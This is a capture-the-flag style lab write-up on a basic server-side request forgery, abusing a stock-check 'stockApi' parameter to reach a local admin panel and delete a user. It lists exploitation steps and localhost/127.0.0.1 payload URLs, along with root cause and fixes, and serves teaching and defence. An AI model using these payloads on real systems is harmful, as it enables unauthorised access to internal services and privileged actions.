# basic-ssrf-local-server

## Objective

Exploit a server-side request forgery (SSRF) vulnerability in the stock checking feature to force the server to send a request to its own internal interface and access the admin panel. The final goal is to trigger the deletion of the user `carlos`.

## What is happening

The application provides a feature that allows users to check stock availability by sending a URL to the backend. Instead of restricting or validating this input, the server directly uses it to make an HTTP request.

This creates a trust boundary issue: the server treats user-controlled input as a trusted destination for internal requests.

## Request Flow

```

Client → Vulnerable Application → Internal HTTP Request → Target URL

```

The important detail is that the request is executed **server-side**, not from the client machine. This allows access to internal-only resources.

## Vulnerable Behavior

The backend performs something equivalent to:

- PHP: `curl_exec($ch)`
- Python: `requests.get(url)`
- Java: `restTemplate.getForObject(url, String.class)`

No validation is applied to the input URL.

## Exploitation Steps

1. Intercept the stock check request using a proxy.

2. Identify the parameter responsible for the external request:
```

stockApi

```

3. Modify the parameter to target the local server:
```

[http://localhost/admin](http://localhost/admin)

```

4. The server responds with the internal admin interface HTML.

5. Inspect the response and identify the delete endpoint:
```

/admin/delete?username=carlos

```

6. Modify the request to trigger the deletion:
```

[http://localhost/admin/delete?username=carlos](http://localhost/admin/delete?username=carlos)

```

7. The server executes the request internally and deletes the user.

## Payloads

```

[http://localhost/admin](http://localhost/admin)
[http://127.0.0.1/admin](http://127.0.0.1/admin)
[http://localhost/admin/delete?username=carlos](http://localhost/admin/delete?username=carlos)
[http://127.0.0.1/admin/delete?username=carlos](http://127.0.0.1/admin/delete?username=carlos)

```

## Root Cause

- User input is directly used in a server-side HTTP request
- No allowlist or validation of destination URLs
- Internal services are exposed to server-side requests
- Trust boundary between user input and backend is broken

## Impact

- Access to internal admin panels
- Execution of privileged actions
- Exposure of internal services
- Potential pivot to internal network
- Cloud metadata exposure in real scenarios

## Secure Fix

- Validate and restrict allowed domains (allowlist)
- Block internal IP ranges:
  - 127.0.0.1
  - localhost
  - private IP ranges
- Disable URL redirects
- Parse and validate hostname strictly
- Enforce network-level isolation

## Key Takeaway

SSRF allows an attacker to turn the server into a proxy that can access internal resources. Any feature that fetches a URL must be treated as a high-risk input and strictly validated.
```
